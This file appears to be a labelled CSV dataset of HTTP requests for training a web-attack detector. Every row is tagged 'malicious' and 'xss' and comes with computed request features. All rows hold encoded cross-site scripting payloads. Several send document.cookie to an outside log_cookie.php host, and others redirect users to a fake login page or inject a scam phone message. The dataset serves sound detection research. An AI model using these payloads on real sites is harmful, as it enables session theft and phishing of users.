RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek
GET,/rest/products/search,file=%26%23x3c%3B%26%23x69%3B%26%23x6d%3B%26%23x67%3B%26%23x20%3B%26%23x73%3B%26%23x72%3B%26%23x63%3B%26%23x3d%3B%26%23x78%3B%26%23x20%3B%26%23x6f%3B%26%23x6e%3B%26%23x65%3B%26%23x72%3B%26%23x72%3B%26%23x6f%3B%26%23x72%3B%26%23x3d%3B%26%23x77%3B%26%23x69%3B%26%23x6e%3B%26%23x64%3B%26%23x6f%3B%26%23x77%3B%26%23x2e%3B%26%23x6c%3B%26%23x6f%3B%26%23x63%3B%26%23x61%3B%26%23x74%3B%26%23x69%3B%26%23x6f%3B%26%23x6e%3B%26%23x2e%3B%26%23x68%3B%26%23x72%3B%26%23x65%3B%26%23x66%3B%26%23x20%3B%26%23x3d%3B%26%23x20%3B%26%23x22%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x73%3B%26%23x3a%3B%26%23x2f%3B%26%23x2f%3B%26%23x70%3B%26%23x61%3B%26%23x6e%3B%26%23x6b%3B%26%23x6f%3B%26%23x66%3B%26%23x61%3B%26%23x6d%3B%26%23x65%3B%26%23x72%3B%26%23x69%3B%26%23x6b%3B%26%23x61%3B%26%23x2e%3B%26%23x63%3B%26%23x6f%3B%26%23x6d%3B%26%23x2f%3B%26%23x66%3B%26%23x61%3B%26%23x6b%3B%26%23x65%3B%26%23x5f%3B%26%23x6c%3B%26%23x6f%3B%26%23x67%3B%26%23x69%3B%26%23x6e%3B%26%23x22%3B%26%23x3b%3B%26%23x3e%3B,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1232,21,989,0,1,492,249,246,0,0.2465,0,30,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,data=%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x43%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x45%3B%26%23x64%3B%26%23x6f%3B%26%23x63%3B%26%23x75%3B%26%23x6d%3B%26%23x65%3B%26%23x6e%3B%26%23x74%3B%26%23x2e%3B%26%23x62%3B%26%23x6f%3B%26%23x64%3B%26%23x79%3B%26%23x2e%3B%26%23x69%3B%26%23x6e%3B%26%23x6e%3B%26%23x65%3B%26%23x72%3B%26%23x48%3B%26%23x54%3B%26%23x4d%3B%26%23x4c%3B%26%23x25%3B%26%23x32%3B%26%23x42%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x44%3B%26%23x25%3B%26%23x32%3B%26%23x42%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x32%3B%26%23x37%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x43%3B%26%23x68%3B%26%23x31%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x45%3B%26%23x54%3B%26%23x72%3B%26%23x75%3B%26%23x73%3B%26%23x74%3B%26%23x25%3B%26%23x32%3B%26%23x42%3B%26%23x6d%3B%26%23x65%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x32%3B%26%23x31%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x43%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x32%3B%26%23x46%3B%26%23x68%3B%26%23x31%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x45%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x43%3B%26%23x70%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x45%3B%26%23x43%3B%26%23x61%3B%26%23x6c%3B%26%23x6c%3B%26%23x25%3B%26%23x32%3B%26%23x42%3B%26%23x6d%3B%26%23x65%3B%26%23x25%3B%26%23x32%3B%26%23x42%3B%26%23x61%3B%26%23x74%3B%26%23x25%3B%26%23x32%3B%26%23x42%3B%26%23x31%3B%26%23x25%3B%26%23x32%3B%26%23x42%3B%26%23x38%3B%26%23x38%3B%26%23x38%3B%26%23x25%3B%26%23x32%3B%26%23x42%3B%26%23x33%3B%26%23x34%3B%26%23x35%3B%26%23x25%3B%26%23x32%3B%26%23x42%3B%26%23x38%3B%26%23x34%3B%26%23x34%3B%26%23x33%3B%26%23x2e%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x43%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x32%3B%26%23x46%3B%26%23x70%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x45%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x32%3B%26%23x37%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x42%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x43%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x32%3B%26%23x46%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x25%3B%26%23x32%3B%26%23x35%3B%26%23x33%3B%26%23x45%3B,HTTP/1.1,Exabot/3.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,2481,21,2345,0,1,1170,588,585,0,0.2485,0,27,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,term=DaTA%25253ATExt%25252FhTml%25252C%2525253cScrIPt%2525253EwinDoW.lOCaTION.HrEF%25252B%2525253d%25252B%25252522hTtps%2525253a%2525252F%2525252fpANKOFAMeriKA.cOm%2525252FfAke_LoGin%25252522%2525253b%2525253C%2525252fSCripT%2525253E,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,437,21,233,0,1,192,25,18,18,0.0984,3,46,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,query=%2526%2523%2578%2533%2563%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2537%2536%253b%2526%2523%2578%2536%2537%253b%2526%2523%2578%2532%2566%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2562%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2537%2539%253b%2526%2523%2578%2537%2535%253b%2526%2523%2578%2537%2530%253b%2526%2523%2578%2533%2564%253b%2526%2523%2578%2537%2537%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2534%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2537%2537%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2536%2538%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2536%2536%253b%2526%2523%2578%2532%2530%253b%2526%2523%2578%2533%2564%253b%2526%2523%2578%2532%2530%253b%2526%2523%2578%2532%2532%253b%2526%2523%2578%2536%2538%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2537%2534%253b%2526%2523%2578%2537%2530%253b%2526%2523%2578%2537%2533%253b%2526%2523%2578%2533%2561%253b%2526%2523%2578%2532%2566%253b%2526%2523%2578%2532%2566%253b%2526%2523%2578%2537%2530%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2536%2562%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2536%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2536%2564%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2537%2532%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2536%2562%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2532%2565%253b%2526%2523%2578%2536%2533%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2564%253b%2526%2523%2578%2532%2566%253b%2526%2523%2578%2536%2536%253b%2526%2523%2578%2536%2531%253b%2526%2523%2578%2536%2562%253b%2526%2523%2578%2536%2535%253b%2526%2523%2578%2535%2566%253b%2526%2523%2578%2536%2563%253b%2526%2523%2578%2536%2566%253b%2526%2523%2578%2536%2537%253b%2526%2523%2578%2536%2539%253b%2526%2523%2578%2536%2565%253b%2526%2523%2578%2532%2532%253b%2526%2523%2578%2533%2562%253b%2526%2523%2578%2533%2565%253b,HTTP/1.1,Wget/,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,2417,21,2286,0,1,1368,459,456,456,0.199,0,27,False,False,False,False,3,False,True,False,False,4,20,Thursday
POST,/api/Cards,,HTTP/1.1,Nmap Scripting Engine,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:1924,"{""fullName"": ""%26%23x58%3B%26%23x53%3B%26%23x53%3B%26%23x20%3B%26%23x43%3B%26%23x61%3B%26%23x72%3B%26%23x64%3B%26%23x68%3B%26%23x6f%3B%26%23x6c%3B%26%23x64%3B%26%23x65%3B%26%23x72%3B%26%23x20%3B%26%23x3c%3B%26%23x69%3B%26%23x6e%3B%26%23x70%3B%26%23x75%3B%26%23x74%3B%26%23x20%3B%26%23x74%3B%26%23x79%3B%26%23x70%3B%26%23x65%3B%26%23x3d%3B%26%23x74%3B%26%23x65%3B%26%23x78%3B%26%23x74%3B%26%23x20%3B%26%23x6f%3B%26%23x6e%3B%26%23x69%3B%26%23x6e%3B%26%23x70%3B%26%23x75%3B%26%23x74%3B%26%23x3d%3B%26%23x64%3B%26%23x6f%3B%26%23x63%3B%26%23x75%3B%26%23x6d%3B%26%23x65%3B%26%23x6e%3B%26%23x74%3B%26%23x2e%3B%26%23x62%3B%26%23x6f%3B%26%23x64%3B%26%23x79%3B%26%23x2e%3B%26%23x69%3B%26%23x6e%3B%26%23x6e%3B%26%23x65%3B%26%23x72%3B%26%23x48%3B%26%23x54%3B%26%23x4d%3B%26%23x4c%3B%26%23x20%3B%26%23x3d%3B%26%23x20%3B%26%23x27%3B%26%23x3c%3B%26%23x68%3B%26%23x31%3B%26%23x3e%3B%26%23x54%3B%26%23x72%3B%26%23x75%3B%26%23x73%3B%26%23x74%3B%26%23x20%3B%26%23x6d%3B%26%23x65%3B%26%23x21%3B%26%23x3c%3B%26%23x2f%3B%26%23x68%3B%26%23x31%3B%26%23x3e%3B%26%23x3c%3B%26%23x70%3B%26%23x3e%3B%26%23x43%3B%26%23x61%3B%26%23x6c%3B%26%23x6c%3B%26%23x20%3B%26%23x6d%3B%26%23x65%3B%26%23x20%3B%26%23x61%3B%26%23x74%3B%26%23x20%3B%26%23x31%3B%26%23x20%3B%26%23x38%3B%26%23x38%3B%26%23x38%3B%26%23x20%3B%26%23x33%3B%26%23x34%3B%26%23x35%3B%26%23x20%3B%26%23x38%3B%26%23x34%3B%26%23x34%3B%26%23x33%3B%26%23x2e%3B%26%23x3c%3B%26%23x2f%3B%26%23x70%3B%26%23x3e%3B%26%23x27%3B%26%23x3b%3B%26%23x20%3B%26%23x61%3B%26%23x75%3B%26%23x74%3B%26%23x6f%3B%26%23x66%3B%26%23x6f%3B%26%23x63%3B%26%23x75%3B%26%23x73%3B%26%23x3e%3B"", ""cardNum"": ""%2526%2523x31%253B%2526%2523x31%253B%2526%2523x31%253B%2526%2523x31%253B%2526%2523x32%253B%2526%2523x32%253B%2526%2523x32%253B%2526%2523x32%253B%2526%2523x33%253B%2526%2523x33%253B%2526%2523x33%253B%2526%2523x33%253B%2526%2523x36%253B%2526%2523x30%253B%2526%2523x37%253B%2526%2523x37%253B"", ""expMonth"": 11, ""expYear"": 2029}",,malicious,xss,2114,10,0,1924,4,1572,464,441,48,0.2399,0,41,True,False,False,False,2,False,True,False,False,6,20,Thursday
GET,/rest/products/search,path=%25253CIMG%252Bsrc%25253DX%252BONCHAnGe%25253Dnew%252BiMAGE%252528%252529.SRc%252B%25253D%252B%252522https%25253A%25252F%25252FWeNoJHDsKdsF.CoM%25252FlOg_cooKIe.pHP%25253FC%25253D%252522%252B%25252B%252BdOCumENt.COOkiE%25253B%25253E,HTTP/1.1,Python-requests/2.31.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,385,21,237,0,1,184,32,24,24,0.124,2,47,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,term=%3Cimg+src%3Dx+onerror%3Ddocument.body.innerHTML+%3D+%27%3Ch1%3ETrust+me%21%3C%2Fh1%3E%3Cp%3ECall+me+at+1+888+345+8443.%3C%2Fp%3E%27%3B%3E,HTTP/1.1,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,343,21,143,0,1,100,36,19,0,0.2195,0,40,False,False,False,False,3,True,True,False,False,4,20,Thursday
POST,/rest/chatbot,,HTTP/1.1,Nmap Scripting Engine,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:281,"{""query"": ""Help%252Bme%252Bwith%252Bmy%252Border%25253A%252B%25253Csvg%25252Fonkeydown%25253Dnew%252BImage%252528%252529.src%252B%25253D%252B%252522https%25253A%25252F%25252Fwenojhdskdsf.com%25252Flog_cookie.php%25253Fc%25253D%252522%252B%25252B%252Bdocument.cookie%25253B%25253E""}",,malicious,xss,473,13,0,281,1,268,42,28,28,0.1429,1,46,True,False,False,False,2,False,True,False,False,6,20,Thursday
GET,/rest/products/search,category=%2525253Cbody%25252Bonload%2525253Dnew%25252BImage%25252528%25252529.src%25252B%2525253D%25252B%25252522https%2525253A%2525252F%2525252Fwenojhdskdsf.com%2525252Flog_cookie.php%2525253Fc%2525253D%25252522%25252B%2525252B%25252Bdocument.cookie%2525253B%2525253E,HTTP/1.1,Acunetix/,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,403,21,268,0,1,215,30,22,22,0.1038,1,39,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,file=%26%23x3c%3B%26%23x69%3B%26%23x6e%3B%26%23x70%3B%26%23x75%3B%26%23x74%3B%26%23x20%3B%26%23x74%3B%26%23x79%3B%26%23x70%3B%26%23x65%3B%26%23x3d%3B%26%23x73%3B%26%23x65%3B%26%23x61%3B%26%23x72%3B%26%23x63%3B%26%23x68%3B%26%23x20%3B%26%23x6f%3B%26%23x6e%3B%26%23x63%3B%26%23x6c%3B%26%23x69%3B%26%23x63%3B%26%23x6b%3B%26%23x3d%3B%26%23x6e%3B%26%23x65%3B%26%23x77%3B%26%23x20%3B%26%23x49%3B%26%23x6d%3B%26%23x61%3B%26%23x67%3B%26%23x65%3B%26%23x28%3B%26%23x29%3B%26%23x2e%3B%26%23x73%3B%26%23x72%3B%26%23x63%3B%26%23x20%3B%26%23x3d%3B%26%23x20%3B%26%23x22%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x73%3B%26%23x3a%3B%26%23x2f%3B%26%23x2f%3B%26%23x77%3B%26%23x65%3B%26%23x6e%3B%26%23x6f%3B%26%23x6a%3B%26%23x68%3B%26%23x64%3B%26%23x73%3B%26%23x6b%3B%26%23x64%3B%26%23x73%3B%26%23x66%3B%26%23x2e%3B%26%23x63%3B%26%23x6f%3B%26%23x6d%3B%26%23x2f%3B%26%23x6c%3B%26%23x6f%3B%26%23x67%3B%26%23x5f%3B%26%23x63%3B%26%23x6f%3B%26%23x6f%3B%26%23x6b%3B%26%23x69%3B%26%23x65%3B%26%23x2e%3B%26%23x70%3B%26%23x68%3B%26%23x70%3B%26%23x3f%3B%26%23x63%3B%26%23x3d%3B%26%23x22%3B%26%23x20%3B%26%23x2b%3B%26%23x20%3B%26%23x64%3B%26%23x6f%3B%26%23x63%3B%26%23x75%3B%26%23x6d%3B%26%23x65%3B%26%23x6e%3B%26%23x74%3B%26%23x2e%3B%26%23x63%3B%26%23x6f%3B%26%23x6f%3B%26%23x6b%3B%26%23x69%3B%26%23x65%3B%26%23x3b%3B%26%23x20%3B%26%23x61%3B%26%23x75%3B%26%23x74%3B%26%23x6f%3B%26%23x66%3B%26%23x6f%3B%26%23x63%3B%26%23x75%3B%26%23x73%3B%26%23x3e%3B,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1676,21,1433,0,1,714,360,357,0,0.2476,0,30,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,term=%2525%2532%2535%2533%2543%2573%2576%2567%2525%2532%2535%2532%2546%256f%256e%256d%256f%2575%2573%2565%256f%2576%2565%2572%2525%2532%2535%2533%2544%2564%256f%2563%2575%256d%2565%256e%2574%252e%2562%256f%2564%2579%252e%2569%256e%256e%2565%2572%2548%2554%254d%254c%2525%2532%2542%2525%2532%2535%2533%2544%2525%2532%2542%2525%2532%2535%2532%2537%2525%2532%2535%2533%2543%2568%2531%2525%2532%2535%2533%2545%2554%2572%2575%2573%2574%2525%2532%2542%256d%2565%2525%2532%2535%2532%2531%2525%2532%2535%2533%2543%2525%2532%2535%2532%2546%2568%2531%2525%2532%2535%2533%2545%2525%2532%2535%2533%2543%2570%2525%2532%2535%2533%2545%2543%2561%256c%256c%2525%2532%2542%256d%2565%2525%2532%2542%2561%2574%2525%2532%2542%2531%2525%2532%2542%2538%2538%2538%2525%2532%2542%2533%2534%2535%2525%2532%2542%2538%2534%2534%2533%252e%2525%2532%2535%2533%2543%2525%2532%2535%2532%2546%2570%2525%2532%2535%2533%2545%2525%2532%2535%2532%2537%2525%2532%2535%2533%2542%2525%2532%2535%2533%2545,HTTP/1.1,Wget/,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1096,21,965,0,1,576,195,192,192,0.1978,0,26,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,path=%253Ca%2Bhref%253D%2522javascript%253Anew%2BImage%2528%2529.src%2B%253D%2B%2522https%253A%252F%252Fwenojhdskdsf.com%252Flog_cookie.php%253Fc%253D%2522%2B%252B%2Bdocument.cookie%253B%2522%253EDownload%253C%252Fa%253E,HTTP/1.1,Java/1.8.0_301,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,360,21,220,0,1,159,36,28,22,0.1494,2,38,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,search=data%25253Atext%25252Fhtml%25252C%2525253Cscript%2525253Enew%25252BImage%25252528%25252529.src%25252B%2525253D%25252B%25252522https%2525253A%2525252F%2525252Fwenojhdskdsf.com%2525252Flog_cookie.php%2525253Fc%2525253D%25252522%25252B%2525252B%25252Bdocument.cookie%2525253B%2525253C%2525252Fscript%2525253E,HTTP/1.1,Nmap Scripting Engine,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,459,21,312,0,1,253,34,26,26,0.1021,3,38,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,data=%3Csvg%2Fonsubmit%3Dnew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B%3E,HTTP/1.1,GuzzleHttp/7.2,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,275,21,135,0,1,96,30,17,0,0.1923,1,39,False,False,False,False,3,True,True,False,False,4,20,Thursday
POST,/api/PrivacyRequests,,HTTP/1.1,sqlmap/,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:197,"{""subject"": ""mY PRIvacy rEquESt <IMG SRc=X onErRor=ALErt&#40;1&#41;>"", ""message"": ""Please%2Bprocess%2Bmy%2Bdata.%2B%253Cimg%2Bsrc%253Dx%2Bonerror%253Dalert%2526%252340%253B1%2526%252341%253B%253E""}",,malicious,xss,382,20,0,197,2,112,40,16,10,0.1843,4,57,True,False,False,False,2,False,True,False,False,6,20,Thursday
POST,/api/Addresses,,HTTP/1.1,Nikto/,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:3424,"{""fullName"": ""&#x25;&#x35;&#x38;&#x25;&#x35;&#x33;&#x25;&#x35;&#x33;&#x25;&#x32;&#x30;&#x25;&#x35;&#x35;&#x25;&#x37;&#x33;&#x25;&#x36;&#x35;&#x25;&#x37;&#x32;&#x25;&#x32;&#x30;&#x25;&#x33;&#x63;&#x25;&#x36;&#x39;&#x25;&#x36;&#x64;&#x25;&#x36;&#x37;&#x25;&#x32;&#x30;&#x25;&#x37;&#x33;&#x25;&#x37;&#x32;&#x25;&#x36;&#x33;&#x25;&#x33;&#x64;&#x25;&#x37;&#x38;&#x25;&#x32;&#x30;&#x25;&#x36;&#x66;&#x25;&#x36;&#x65;&#x25;&#x36;&#x33;&#x25;&#x36;&#x63;&#x25;&#x36;&#x39;&#x25;&#x36;&#x33;&#x25;&#x36;&#x62;&#x25;&#x33;&#x64;&#x25;&#x36;&#x34;&#x25;&#x36;&#x66;&#x25;&#x36;&#x33;&#x25;&#x37;&#x35;&#x25;&#x36;&#x64;&#x25;&#x36;&#x35;&#x25;&#x36;&#x65;&#x25;&#x37;&#x34;&#x25;&#x32;&#x65;&#x25;&#x36;&#x32;&#x25;&#x36;&#x66;&#x25;&#x36;&#x34;&#x25;&#x37;&#x39;&#x25;&#x32;&#x65;&#x25;&#x36;&#x39;&#x25;&#x36;&#x65;&#x25;&#x36;&#x65;&#x25;&#x36;&#x35;&#x25;&#x37;&#x32;&#x25;&#x34;&#x38;&#x25;&#x35;&#x34;&#x25;&#x34;&#x64;&#x25;&#x34;&#x63;&#x25;&#x32;&#x30;&#x25;&#x33;&#x64;&#x25;&#x32;&#x30;&#x25;&#x32;&#x37;&#x25;&#x33;&#x63;&#x25;&#x36;&#x38;&#x25;&#x33;&#x31;&#x25;&#x33;&#x65;&#x25;&#x35;&#x34;&#x25;&#x37;&#x32;&#x25;&#x37;&#x35;&#x25;&#x37;&#x33;&#x25;&#x37;&#x34;&#x25;&#x32;&#x30;&#x25;&#x36;&#x64;&#x25;&#x36;&#x35;&#x25;&#x32;&#x31;&#x25;&#x33;&#x63;&#x25;&#x32;&#x66;&#x25;&#x36;&#x38;&#x25;&#x33;&#x31;&#x25;&#x33;&#x65;&#x25;&#x33;&#x63;&#x25;&#x37;&#x30;&#x25;&#x33;&#x65;&#x25;&#x34;&#x33;&#x25;&#x36;&#x31;&#x25;&#x36;&#x63;&#x25;&#x36;&#x63;&#x25;&#x32;&#x30;&#x25;&#x36;&#x64;&#x25;&#x36;&#x35;&#x25;&#x32;&#x30;&#x25;&#x36;&#x31;&#x25;&#x37;&#x34;&#x25;&#x32;&#x30;&#x25;&#x33;&#x31;&#x25;&#x32;&#x30;&#x25;&#x33;&#x38;&#x25;&#x33;&#x38;&#x25;&#x33;&#x38;&#x25;&#x32;&#x30;&#x25;&#x33;&#x33;&#x25;&#x33;&#x34;&#x25;&#x33;&#x35;&#x25;&#x32;&#x30;&#x25;&#x33;&#x38;&#x25;&#x33;&#x34;&#x25;&#x33;&#x34;&#x25;&#x33;&#x33;&#x25;&#x32;&#x65;&#x25;&#x33;&#x63;&#x25;&#x32;&#x66;&#x25;&#x37;&#x30;&#x25;&#x33;&#x65;&#x25;&#x32;&#x37;&#x25;&#x33;&#x62;&#x25;&#x33;&#x65;"", ""country"": ""%55%53%41"", ""zipCode"": ""%31%32%33%34%35"", ""streetAddress"": ""&#x58;&#x53;&#x53;&#x25;&#x32;&#x42;&#x53;&#x74;&#x72;&#x65;&#x65;&#x74;&#x25;&#x32;&#x42;&#x25;&#x32;&#x35;&#x33;&#x43;&#x69;&#x6d;&#x67;&#x25;&#x32;&#x42;&#x73;&#x72;&#x63;&#x25;&#x32;&#x35;&#x33;&#x44;&#x78;&#x25;&#x32;&#x42;&#x6f;&#x6e;&#x63;&#x6c;&#x69;&#x63;&#x6b;&#x25;&#x32;&#x35;&#x33;&#x44;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x62;&#x6f;&#x64;&#x79;&#x2e;&#x69;&#x6e;&#x6e;&#x65;&#x72;&#x48;&#x54;&#x4d;&#x4c;&#x25;&#x32;&#x42;&#x25;&#x32;&#x35;&#x33;&#x44;&#x25;&#x32;&#x42;&#x25;&#x32;&#x35;&#x32;&#x37;&#x25;&#x32;&#x35;&#x33;&#x43;&#x68;&#x31;&#x25;&#x32;&#x35;&#x33;&#x45;&#x54;&#x72;&#x75;&#x73;&#x74;&#x25;&#x32;&#x42;&#x6d;&#x65;&#x25;&#x32;&#x35;&#x32;&#x31;&#x25;&#x32;&#x35;&#x33;&#x43;&#x25;&#x32;&#x35;&#x32;&#x46;&#x68;&#x31;&#x25;&#x32;&#x35;&#x33;&#x45;&#x25;&#x32;&#x35;&#x33;&#x43;&#x70;&#x25;&#x32;&#x35;&#x33;&#x45;&#x43;&#x61;&#x6c;&#x6c;&#x25;&#x32;&#x42;&#x6d;&#x65;&#x25;&#x32;&#x42;&#x61;&#x74;&#x25;&#x32;&#x42;&#x31;&#x25;&#x32;&#x42;&#x38;&#x38;&#x38;&#x25;&#x32;&#x42;&#x33;&#x34;&#x35;&#x25;&#x32;&#x42;&#x38;&#x34;&#x34;&#x33;&#x2e;&#x25;&#x32;&#x35;&#x33;&#x43;&#x25;&#x32;&#x35;&#x32;&#x46;&#x70;&#x25;&#x32;&#x35;&#x33;&#x45;&#x25;&#x32;&#x35;&#x32;&#x37;&#x25;&#x32;&#x35;&#x33;&#x42;&#x25;&#x32;&#x35;&#x33;&#x45;"", ""city"": ""%252558%252553%252553%252520%252543%252569%252574%252579"", ""state"": ""&#x58;&#x58;""}",,malicious,xss,3603,14,0,3424,6,1962,1681,16,8,0.4889,0,43,True,False,False,False,2,False,True,False,False,6,20,Thursday
GET,/rest/products/search,query=%3Cinput+type%3Dsearch+onchange%3Dnew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B+autofocus%3E,HTTP/1.1,Nikto/2.1.6,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,297,21,160,0,1,120,33,17,0,0.1823,3,39,False,False,False,False,3,False,True,False,False,4,20,Thursday
